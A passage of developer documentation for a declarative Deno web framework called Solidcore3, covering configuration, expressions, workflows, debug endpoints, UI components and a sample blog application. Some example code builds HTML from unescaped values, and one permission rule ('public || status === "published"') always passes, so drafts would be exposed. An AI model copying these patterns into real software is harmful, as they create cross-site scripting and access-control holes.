        level: 'warn',
        format: 'json',
        destination: 'file',
        maxFileSize: '10MB',
        maxFiles: 5
      },
      healthCheck: {
        enabled: true,
        endpoint: '/health',
        timeout: 5000
      }
    },
    alerts: {
      enabled: false,
      channels: {
        email: {
          enabled: false,
          smtp: {
            host: process.env.SMTP_HOST,
            port: parseInt(process.env.SMTP_PORT || '587'),
            secure: false,
            auth: {
              user: process.env.SMTP_USER,
              pass: process.env.SMTP_PASS
            }
          },
          from: process.env.EMAIL_FROM || 'alerts@yourapp.com',
          to: process.env.ALERT_EMAIL || 'admin@yourapp.com'
        },
        slack: {
          enabled: false,
          webhookUrl: process.env.SLACK_WEBHOOK_URL,
          channel: '#alerts',
          username: 'Solidcore3'
        },
        webhook: {
          enabled: false,
          url: process.env.ALERT_WEBHOOK_URL,
          headers: {
            'Authorization': `Bearer ${process.env.ALERT_WEBHOOK_TOKEN}`
          }
        }
      },
      rules: {
        errorRate: { threshold: 0.05, window: '5m' },
        responseTime: { threshold: 2000, window: '5m' },
        memoryUsage: { threshold: 0.8, window: '1m' },
        diskSpace: { threshold: 0.9, window: '1m' }
      }
    }
  }
};
```

#### **Environment Variable Support**
```bash
# All configuration can be overridden with environment variables:

# Server
PORT=8000
HOST=0.0.0.0
CORS_ORIGIN=http://localhost:3000

# Database  
DATABASE_URL=libsql://your-db.turso.io
TURSO_AUTH_TOKEN=your-token
TURSO_SYNC_URL=your-sync-url

# Security
JWT_SECRET=your-secret-key
DB_ENCRYPTION_KEY=your-encryption-key

# Extensions
EXTENSIONS_ENABLED=true
EXTENSIONS_DIRECTORY=./app/extensions

# Monitoring
LOG_LEVEL=info
METRICS_ENABLED=true
HEALTH_CHECK_ENABLED=true

# Alerts  
ALERT_EMAIL=admin@yourapp.com
SLACK_WEBHOOK_URL=https://hooks.slack.com/...
ALERT_WEBHOOK_URL=https://api.pagerduty.com/...
```

#### **Configuration Management API**
```typescript
import { configManager } from '../core/config/manager.ts';

// Get configuration values
const port = configManager.get('server.port');
const dbUrl = configManager.get('database.url');

// Set configuration at runtime
configManager.set('development.logLevel', 'debug');

// Listen for configuration changes
configManager.addChangeListener((change) => {
  console.log(`Config changed: ${change.path} = ${change.newValue}`);
});

// Export current configuration
await configManager.export('./current-config.json');

// Validate configuration
const validation = configManager.validate();
if (!validation.valid) {
  console.error('Configuration errors:', validation.errors);
}
```

### 🔍 **Expression Parser & Evaluation Engine**

**Safe expression parsing for permissions, conditions, and computed fields.**

#### **Expression Language**
```typescript
// Supported operators and syntax:
'user.role === "admin"'                    // Equality
'entity.priority > 2'                      // Comparison  
'authenticated && user.verified'           // Logical AND
'user.role === "admin" || user.role === "moderator"'  // Logical OR
'!(user.suspended)'                        // Negation
'(user.role === "admin") && (entity.status !== "deleted")'  // Grouping
```

#### **Built-in Variables**
- **`user`**: Current user object with all fields
- **`entity`**: Current entity being accessed
- **`authenticated`**: Boolean - is user logged in
- **`public`**: Boolean - always true (for public access)
- **`owner`**: Boolean - is user the owner of the entity

#### **Field Access**
```typescript
// Dot notation for nested access:
'user.profile.department'        // Nested object access
'entity.metadata.priority'       // JSON field access
'user.roles[0]'                 // Array access (if supported)
```

#### **Expression Parser API**
```typescript
import { SafeExpressionParser } from '../core/expression/parser.ts';

const parser = new SafeExpressionParser();

// Validate expression syntax
const validation = parser.validate('user.role === "admin"');
if (validation.success) {
  console.log('Expression is valid');
} else {
  console.error('Syntax error:', validation.error);
}

// Evaluate expression with context
const context = {
  user: { role: 'admin', id: '123' },
  entity: { ownerId: '123', status: 'active' },
  authenticated: true
};

const result = parser.evaluate('user.role === "admin"', context);
console.log('Expression result:', result); // true
```

### 🔄 **Event System & Workflow Engine**

**Event-driven architecture with automatic workflow execution.**

#### **Built-in Events**
```typescript
// Entity lifecycle events (auto-emitted):
'Entity.created'     // When entity is created
'Entity.updated'     // When entity is updated  
'Entity.deleted'     // When entity is deleted
'Entity.behavior'    // When behavior is executed

// System events:
'system.startup'     // Application startup
'system.shutdown'    // Application shutdown
'system.error'       // System errors
'system.metrics'     // Performance metrics
```

#### **Built-in Workflow Actions**
```typescript
// Email actions
{
  type: 'email',
  to: 'user@example.com',
  subject: 'Task Updated',
  body: 'Your task ${data.title} has been updated',
  template: 'task-notification'  // Optional template
}

// Slack actions
{
  type: 'slack',
  channel: '#notifications',
  message: 'Task completed: ${data.title}',
  webhookUrl: process.env.SLACK_WEBHOOK_URL,
  attachments: [{
    color: 'good',
    title: 'Task Completed',
    fields: [
      { title: 'Title', value: '${data.title}' },
      { title: 'Priority', value: '${data.priority}' }
    ]
  }]
}

// Database actions
{
  type: 'database',
  operation: 'update',
  entity: 'Stats',
  where: { type: 'task_completion' },
  data: { count: 'count + 1' }
}

// Webhook actions
{
  type: 'webhook',
  url: 'https://api.external-service.com/notify',
  method: 'POST',
  headers: {
    'Authorization': 'Bearer ${env.API_TOKEN}',
    'Content-Type': 'application/json'
  },
  body: {
    event: '${event.type}',
    data: '${data}',
    timestamp: '${timestamp}'
  },
  retries: 3,
  timeout: 5000
}

// Log actions
{
  type: 'log',
  level: 'info',
  message: 'Task ${data.title} completed by ${user.name}',
  data: {
    taskId: '${data.id}',
    userId: '${user.id}',
    completedAt: '${timestamp}'
  }
}
```

#### **Workflow Conditions**
```typescript
// Complex conditions using expression parser:
workflows: {
  urgentTaskAlert: {
    trigger: 'Task.created',
    condition: 'data.priority === "high" && data.dueDate < Date.now() + 86400000',
    actions: [
      { type: 'slack', channel: '#urgent', message: 'Urgent task created!' }
    ]
  },
  
  completionReward: {
    trigger: 'Task.completed',
    condition: 'user.tasksCompleted >= 10',
    actions: [
      { type: 'database', operation: 'update', entity: 'User', data: { badge: 'productive' } }
    ]
  }
}
```

### 📊 **Truth File Analyzer**

**Automatic analysis and optimization recommendations for your application.**

#### **Analysis Features**
```typescript
// Automatic analysis available at /dashboard/truth
const analysis = {
  "overview": {
    "entities": 5,
    "totalFields": 23,
    "views": 8,
    "workflows": 3,
    "healthScore": 85    // 0-100 based on best practices
  },
  
  "entities": {
    "Task": {
      "fieldCount": 8,
      "hasId": true,
      "hasTimestamps": true,
      "relationships": ["User"],
      "permissions": "secure",
      "uiConfigured": true
    }
  },
  
  "performance": {
    "recommendedIndexes": [
      { "entity": "Task", "fields": ["status", "assigneeId"] },
      { "entity": "User", "fields": ["email"] }
    ],
    "potentialN1Issues": [
      { "entity": "Task", "relationship": "assignee", "views": ["TaskList"] }
    ]
  },
  
  "security": {
    "permissionIssues": [
      { "entity": "Task", "issue": "delete permission too permissive", "severity": "medium" }
    ],
    "recommendations": [
      "Add role-based permissions for sensitive operations"
    ]
  },
  
  "suggestions": [
    "Consider adding caching for frequently accessed User data",
    "Task entity could benefit from a search index on title field",
    "Add validation rules for email fields"
  ]
}
```

### 🛠️ **Debug & Development Tools**

**Built-in debugging and development utilities.**

#### **Debug Endpoints**
```bash
# System health and status
GET /health                 # System health check
GET /debug/db              # Database inspection  
GET /debug/extensions      # Extension information
GET /debug/validation      # Truth file validation results
GET /debug/config          # Current configuration
GET /debug/events          # Recent events and workflows

# Interactive tools
GET /dashboard             # Complete admin interface
GET /dashboard/api         # API testing interface
GET /dashboard/database    # SQL query interface
```

#### **Development CLI Support**
```bash
# CLI arguments supported:
deno run --allow-all runtime/server.ts \
  --port 3000 \
  --debug \
  --log-level debug \
  --database ./dev.db \
  --config ./dev.config.ts
```

#### **Hot Reload System**
- **Truth file watching**: Automatic reload on `app.truth.ts` changes
- **Extension hot reload**: Extensions reload without restart
- **Configuration reloading**: Config changes applied instantly
- **Database schema sync**: Automatic migrations on truth file changes

### 🎨 8. CUSTOM UI COMPONENTS

> **🚨 BUILD SYSTEM CLARIFICATION**: Solidcore3 uses a **radically different approach** than traditional React applications. Understanding this is crucial.

#### **No Traditional Build System**
- **❌ No .tsx files**: Components are TypeScript functions returning HTML strings
- **❌ No JSX compilation**: No webpack, vite, or build pipeline
- **❌ No client-side React**: Everything generated server-side
- **✅ HTM for client-side**: Uses HTM (Hyperscript Tagged Markup) when Preact needed

#### **How UI Actually Works**
Solidcore3 uses **string-based component generation** instead of JSX:

```typescript
// ✅ This is how components actually work:
// /core/ui/components/Layout.ts (string-based)
export function Stack({ children, gap = 4, ...props }: StackProps): string {
  const additionalStyles = `
    display: flex;
    flex-direction: column;
    gap: ${gap * 0.25}rem;
  `;
  
  return buildElement('div', props, children, additionalStyles);
}

// ❌ NOT like this (traditional JSX):
// export function Stack({ children }: Props) {
//   return <div className="stack">{children}</div>;
// }
```

#### **Custom Component Creation**
```typescript
// app/ui/CustomComponent.ts (Note: .ts not .tsx)
import { BaseProps } from '../../core/ui/types/base-props.ts';
import { buildElement } from '../../core/ui/utils/prop-utils.ts';

interface CustomComponentProps extends BaseProps {
  title: string;
  data: any[];
  variant?: 'compact' | 'detailed';
}

export function CustomComponent({ 
  title, 
  data, 
  variant = 'compact',
  ...props 
}: CustomComponentProps): string {
  const items = data.map(item => `
    <div class="item ${variant}">
      <h4>${item.name}</h4>
      ${variant === 'detailed' ? `<p>${item.description}</p>` : ''}
    </div>
  `).join('');
  
  const content = `
    <h3>${title}</h3>
    <div class="items-container">
      ${items}
    </div>
  `;
  
  return buildElement('div', { className: 'custom-component', ...props }, content);
}
```

#### **HTM for Client-Side Preact (When Needed)**
```typescript
// Only when you need actual client-side interactivity
import { html } from 'htm/preact';
import { useState } from 'preact/hooks';

export function InteractiveComponent() {
  const [count, setCount] = useState(0);
  
  return html`
    <div>
      <p>Count: ${count}</p>
      <button onClick=${() => setCount(count + 1)}>
        Increment
      </button>
    </div>
  `;
}
```

#### **Integration via Extensions**
```typescript
// app/extensions/my-ui.ts
import { UIExtension } from '../../core/types/extensions.ts';
import { CustomComponent } from '../ui/CustomComponent.ts';

const extension: UIExtension = {
  name: 'custom-ui',
  type: 'ui',
  
  components: [{
    name: 'custom-component',
    inject: {
      position: 'replace',
      target: '.entity-list',
      content: CustomComponent({
        title: 'Enhanced List',
        data: context.data,
        variant: 'detailed'
      })
    }
  }]
};

export default extension;
```

#### **Why This Approach?**
1. **No Build Complexity**: Everything runs directly in Deno with TypeScript
2. **Server-Side Generation**: Complete HTML pages generated on server
3. **Zero Client JS**: Unless explicitly needed for interactivity
4. **Type Safety**: Full TypeScript support without compilation step
5. **Hot Reload**: Instant changes without build process

---

## 📁 8. STATIC ASSETS

Store images, stylesheets, and scripts.

```
app/static/
├── images/
│   ├── logo.png
│   ├── icons/
│   └── backgrounds/
├── styles/
│   ├── custom.css
│   └── themes/
└── scripts/
    ├── analytics.js
    └── custom.js
```

### Accessing Static Assets
```html
<!-- In generated HTML -->
<img src="/static/images/logo.png" alt="Logo">
<link rel="stylesheet" href="/static/styles/custom.css">
<script src="/static/scripts/analytics.js"></script>
```

---

## 🚀 What Gets Auto-Generated

From your truth file definition, the framework automatically creates:

### 📊 Database Layer
- SQLite tables with proper columns
- Indexes for performance  
- Foreign key relationships
- Audit fields (created_at, updated_at)
- Migration scripts

### 🌐 API Layer  
- REST endpoints for all entities
  - `GET /api/entity` - List all
  - `GET /api/entity/:id` - Get one
  - `POST /api/entity` - Create
  - `PUT /api/entity/:id` - Update
  - `DELETE /api/entity/:id` - Delete
- Behavior endpoints
  - `POST /api/entity/:id/behavior` - Execute behavior
- Input validation
- Permission checking
- Error handling
- Response formatting

### 🎨 UI Layer
- Complete web pages for each view
- Forms with proper field types
- Tables with sorting and filtering
- Detail pages with sections
- Navigation between pages
- Responsive design
- Accessibility features

### 🔧 TypeScript Types
- Entity interfaces
- API request/response types
- Form validation schemas
- Component prop types

### 📚 Documentation
- API documentation
- Database schema docs
- UI component docs

---

## 🎯 Complete Real-World Example

Here's a complete truth file for a blog application:

```typescript
// app/app.truth.ts
import { AppDefinition } from '../core/types/index.ts';

export const App: AppDefinition = {
  name: 'BlogCMS',
  version: '1.0.0',
  description: 'A complete blog management system',

  entities: {
    // Authors who write posts
    Author: {
      fields: {
        id: { type: 'uuid', auto: true, unique: true },
        name: { type: 'string', required: true, maxLength: 100 },
        email: { type: 'string', required: true, unique: true },
        bio: { type: 'text' },
        avatar: { type: 'string' },
        isActive: { type: 'boolean', default: true }
      },
      
      ui: {
        display: {
          primary: 'name',
          secondary: 'email',
          avatar: 'avatar',
          badge: 'isActive'
        },
        list: {
          columns: ['name', 'email', 'isActive'],
          searchable: ['name', 'email'],
          actions: ['view', 'edit']
        }
      },
      
      permissions: {
        create: 'admin',
        read: 'authenticated',
        update: 'admin || user.id === entity.id',
        delete: 'admin'
      }
    },

    // Blog categories
    Category: {
      fields: {
        id: { type: 'uuid', auto: true, unique: true },
        name: { type: 'string', required: true, maxLength: 50 },
        slug: { type: 'string', required: true, unique: true },
        description: { type: 'text' },
        color: { type: 'string', default: '#0066cc' }
      },
      
      ui: {
        display: {
          primary: 'name',
          secondary: 'description',
          color: { field: 'name', map: { 'Technology': '#0066cc', 'Lifestyle': '#28a745' } }
        }
      },
      
      permissions: {
        create: 'admin',
        read: 'public',
        update: 'admin',
        delete: 'admin'
      }
    },

    // Blog posts
    Post: {
      fields: {
        id: { type: 'uuid', auto: true, unique: true },
        title: { type: 'string', required: true, maxLength: 200 },
        slug: { type: 'string', required: true, unique: true },
        content: { type: 'text', required: true },
        excerpt: { type: 'text' },
        status: { 
          type: 'enum', 
          values: ['draft', 'published', 'archived'], 
          default: 'draft' 
        },
        featured: { type: 'boolean', default: false },
        publishedAt: { type: 'datetime' },
        authorId: { type: 'relation', to: 'Author', required: true },
        categoryId: { type: 'relation', to: 'Category' },
        tags: { type: 'json', default: [] },
        viewCount: { type: 'integer', default: 0 },
        metadata: { type: 'json', default: {} }
      },
      
      behaviors: {
        publish: {
          modifies: { status: 'published', publishedAt: 'now' },
          emits: 'post.published',
          requires: 'canPublish'
        },
        feature: {
          modifies: { featured: true },
          emits: 'post.featured'
        },
        archive: {
          modifies: { status: 'archived' },
          emits: 'post.archived'
        }
      },
      
      computed: {
        isPublished: 'status === "published"',
        daysSincePublished: '(Date.now() - publishedAt) / (24 * 60 * 60 * 1000)'
      },
      
      indexes: [
        ['status', 'publishedAt'],
        ['authorId'],
        ['categoryId'],
        ['featured']
      ],
      
      ui: {
        display: {
          primary: 'title',
          secondary: 'excerpt',
          badge: 'status',
          color: {
            field: 'status',
            map: {
              draft: '#6c757d',
              published: '#28a745', 
              archived: '#dc3545'
            }
          },
          metadata: ['publishedAt', 'viewCount']
        },
        
        list: {
          columns: ['title', 'status', 'author', 'category', 'publishedAt'],
          sortable: ['title', 'publishedAt', 'viewCount'],
          filterable: ['status', 'categoryId', 'featured'],
          searchable: ['title', 'content', 'excerpt'],
          actions: ['view', 'edit', 'delete']
        },
        
        form: {
          layout: 'sections',
          sections: [
            {
              title: 'Content',
              fields: ['title', 'slug', 'content', 'excerpt']
            },
            {
              title: 'Publishing',
              fields: ['status', 'publishedAt', 'featured'],
              collapsible: true
            },
            {
              title: 'Organization', 
              fields: ['authorId', 'categoryId', 'tags']
            }
          ]
        },
        
        detail: {
          sections: [
            {
              title: 'Content',
              fields: ['title', 'content']
            },
            {
              title: 'Metadata',
              fields: ['status', 'publishedAt', 'viewCount', 'featured']
            },
            {
              title: 'Organization',
              fields: ['authorId', 'categoryId', 'tags']
            }
          ],
          actions: ['edit', 'delete', 'duplicate']
        }
      },
      
      permissions: {
        create: 'authenticated',
        read: 'public || status === "published"',
        update: 'user.id === entity.authorId || user.role === "admin"',
        delete: 'user.id === entity.authorId || user.role === "admin"'
      }
    }
  },

  views: {
    // Public blog views
    BlogHome: {
      type: 'list',
      route: '/',
      entity: 'Post',
      title: 'Latest Posts',
      filters: { status: 'published' }
    },
    
    BlogPost: {
      type: 'detail',
      route: '/post/:id',
      entity: 'Post'
    },
    
    BlogCategory: {
      type: 'list',
      route: '/category/:categoryId',
      entity: 'Post',
      title: 'Posts by Category'
    },

    // Admin views
    AdminDashboard: {
      type: 'list',
      route: '/admin',
      entity: 'Post',
      title: 'Content Management'
    },
    
    CreatePost: {
      type: 'form',
      route: '/admin/posts/new',
      entity: 'Post',
      mode: 'create',
      title: 'Create New Post'
    },
    
    EditPost: {
      type: 'form', 
      route: '/admin/posts/:id/edit',
      entity: 'Post',
      mode: 'edit',
      title: 'Edit Post'
    },

    AuthorManagement: {
      type: 'list',
      route: '/admin/authors',
      entity: 'Author',
      title: 'Manage Authors'
    },

    CategoryManagement: {
      type: 'list',
      route: '/admin/categories', 
      entity: 'Category',
      title: 'Manage Categories'
    }
  },

  workflows: {
    // Welcome new authors
    authorWelcome: {
      trigger: 'Author.created',
      description: 'Welcome new authors to the platform',
      actions: [
        {
          type: 'email',
          to: '${data.email}',
          subject: 'Welcome to BlogCMS!',
          message: 'Welcome ${data.name}! Your author account has been created.'
        }
      ]
    },

    // Notify when posts are published
    postPublished: {
      trigger: 'Post.published',
      description: 'Notify team when posts go live',
      actions: [
        {
          type: 'webhook',
          url: 'https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK',
          data: {
            text: '📝 New post published: ${data.title}',
            channel: '#content'
          }
        },
        {
          type: 'log',
          message: 'Post published: ${data.title} by ${data.authorId}'
        }
      ]
    },

    // Feature popular posts automatically
    autoFeature: {
      trigger: 'Post.updated',
      condition: 'viewCount > 1000 && !featured',
      description: 'Auto-feature posts with high view counts',
      actions: [
        {
          type: 'log',
          message: 'Auto-featuring popular post: ${data.title}'
        }
      ]
    }
  },

  settings: {
    auth: {
      enabled: true,
      provider: 'local',
      sessionTimeout: 1440
    },
    
    ui: {
      theme: 'light',
      layout: 'sidebar'
    }
  }
};
```

This single file creates:
- ✅ Complete blog with posts, authors, categories
- ✅ Public website with post listing and reading
- ✅ Admin dashboard for content management  
- ✅ Author management system
- ✅ Publishing workflow with notifications
- ✅ Automatic database schema
- ✅ Full REST API
- ✅ Responsive web interface
- ✅ Permission system
- ✅ Event-driven automation

**The framework generates everything else automatically!**

---

## 🎯 Best Practices for AI

When creating truth files:

1. **Start Simple**: Begin with core entities, add complexity incrementally
2. **Use Descriptive Names**: Entity and field names should be clear
3. **Plan Relationships**: Think about how entities connect 
4. **Consider UI Early**: How will users interact with this data?
5. **Add Validation**: Use field constraints to ensure data quality
6. **Think Workflows**: What should happen automatically?
7. **Security First**: Always define permissions
8. **Test Incrementally**: Add one entity at a time

### Common Patterns

#### User Management
```typescript
User: {
  fields: {
    email: { type: 'string', required: true, unique: true },
    name: { type: 'string', required: true },
    role: { type: 'enum', values: ['user', 'admin'], default: 'user' },
    isActive: { type: 'boolean', default: true }
  }
}
```

#### Content Management
```typescript
Content: {
  fields: {
    title: { type: 'string', required: true, maxLength: 200 },
    slug: { type: 'string', required: true, unique: true },
    body: { type: 'text', required: true },
    status: { type: 'enum', values: ['draft', 'published'], default: 'draft' },
    publishedAt: { type: 'datetime' }
  },
  behaviors: {
    publish: { modifies: { status: 'published', publishedAt: 'now' } }
  }
}
```

#### Task Management
```typescript
Task: {
  fields: {
    title: { type: 'string', required: true },
    description: { type: 'text' },
    status: { type: 'enum', values: ['todo', 'doing', 'done'], default: 'todo' },
    priority: { type: 'enum', values: ['low', 'medium', 'high'], default: 'medium' },
    dueDate: { type: 'date' },
    assigneeId: { type: 'relation', to: 'User' }
  }
}
```

#### E-commerce
```typescript
Product: {
  fields: {
    name: { type: 'string', required: true },
    price: { type: 'number', required: true, min: 0 },
    inventory: { type: 'integer', default: 0, min: 0 },
    status: { type: 'enum', values: ['active', 'inactive'], default: 'active' },
    categoryId: { type: 'relation', to: 'Category' }
  }
}
```

---

## 🚀 The Engine Revolution: Current State & Future Vision

### Current Engine Capabilities (v1.0)

The Solidcore3 engine today provides:

✅ **What's Working Now**
- **Full Stack Generation**: Database, API, UI from declarations
- **Hot Reload**: Instant updates without restart
- **Type Safety**: End-to-end TypeScript
- **Permission System**: Declarative security
- **Workflow Engine**: Event-driven automation
- **Extension System**: Escape hatches for custom logic
- **Migration System**: Automatic schema evolution
- **Admin Dashboard**: Built-in system management

⚠️ **Current Limitations** (Being Addressed)
- **Relationships**: Forward-only, no population
- **Performance**: No caching, N+1 queries possible
- **Observability**: Basic logging only
- **Security**: Extensions have full access
- **Templates**: No variable interpolation
- **Seeding**: No built-in data seeding

### The Engine Advantage in Practice

#### **Traditional Development**
```typescript
// 50+ files, 1000+ lines of code:
// - models/User.js
// - controllers/UserController.js
// - routes/userRoutes.js
// - migrations/create_users_table.js
// - views/users/index.ejs
// - views/users/form.ejs
// - validators/userValidator.js
// - middleware/auth.js
// ... and more
```

#### **Solidcore3 Engine**
```typescript
// 1 file, 20 lines:
entities: {
  User: {
    fields: {
      email: { type: 'string', required: true, unique: true },
      name: { type: 'string', required: true },
      role: { type: 'enum', values: ['user', 'admin'] }
    },
    permissions: {
      read: 'authenticated',
      update: 'owner || admin'
    }
  }
}
// Engine generates everything else!
```

### Why Engine Architecture Matters

#### **1. Continuous Evolution**
Unlike frameworks frozen at build time, the engine evolves your app continuously:
- Add a field → UI updates instantly
- Change permissions → Applied everywhere
- Modify workflow → Takes effect immediately

#### **2. Consistent Optimization**
The engine optimizes holistically across your entire app:
- Knows all your queries → Can optimize globally
- Sees access patterns → Can pre-cache intelligently
- Controls execution → Can batch operations

#### **3. Future-Proof Development**
New capabilities come without changing your code:
- Mobile apps from same truth file
- API versioning automatic
- Performance improvements transparent
- Security updates instant

### The Roadmap: Unleashing Engine Potential

#### **Near Term (3-6 months)**
- **🔗 Full Relationships**: Bidirectional, populated, optimized
- **🚀 Performance Layer**: Multi-tier caching, query optimization
- **📊 Observability**: Metrics, tracing, structured logging
- **🌱 Data Seeding**: Built-in fixture system
- **🔒 Secure Extensions**: Sandboxed execution environment

#### **Medium Term (6-12 months)**
- **📱 Mobile Generation**: React Native from truth file
- **🖥️ Desktop Apps**: Electron generation
- **🌍 Multi-Region**: Global deployment from one truth
- **🤖 AI Assistant**: Natural language to truth file
- **📈 Auto-Optimization**: Self-tuning performance

#### **Long Term (12+ months)**
- **👁️ Visual Designer**: Drag-drop truth file creation
- **🔄 Time Travel**: Debug any point in time
- **🌐 Federation**: Connect multiple Solidcore3 apps
- **🧠 Intelligent Engine**: ML-powered optimizations
- **∞ Infinite Scale**: Auto-scaling infrastructure

### The Philosophical Shift

Solidcore3 represents a fundamental shift in how we build applications:

| Old Way | Engine Way |
|---------|------------|
| Write code that does things | Declare what things should be |
| Manage complexity manually | Engine handles complexity |
| Fixed at compile time | Evolves at runtime |
| Learn framework APIs | Express intent naturally |
| Scale by adding code | Scale by declaration |

### For AI: The Perfect Partner

The engine architecture makes Solidcore3 the ideal framework for AI development:

1. **Single File Understanding**: AI only needs to comprehend the truth file
2. **Declarative Interface**: Natural for AI to generate
3. **No Boilerplate**: AI doesn't generate repetitive code
4. **Immediate Feedback**: AI sees results instantly
5. **Progressive Complexity**: AI can start simple, add features

### For Developers: The Future of Development

The engine approach means:

1. **Focus on Business Logic**: Not implementation details
2. **Consistent Quality**: Engine ensures best practices
3. **Rapid Development**: 10x faster than traditional
4. **Easy Maintenance**: One file to update
5. **Future Features Free**: Engine improvements benefit all apps

### Conclusion: More Than a Framework

Solidcore3 is not just another web framework—it's a **runtime engine** that represents the future of application development. By providing a declarative interface and handling all complexity internally, it enables:

- **AI** to build complete applications
- **Developers** to focus on business value
- **Applications** to evolve continuously
- **Performance** to improve automatically
- **Features** to appear without code changes

The engine architecture is the key to all of this. It's not about what Solidcore3 can do today—it's about what it will be able to do tomorrow, without you changing a single line of code.

**Welcome to the future of development. Welcome to the engine revolution.**

---

This manual covers everything possible in the `/app` directory and the revolutionary engine architecture that makes it all possible. The beauty of Solidcore3 is that this single truth file approach eliminates the complexity of traditional web development while maintaining full power and flexibility through the extension system—all powered by an intelligent runtime engine that will only get smarter over time.

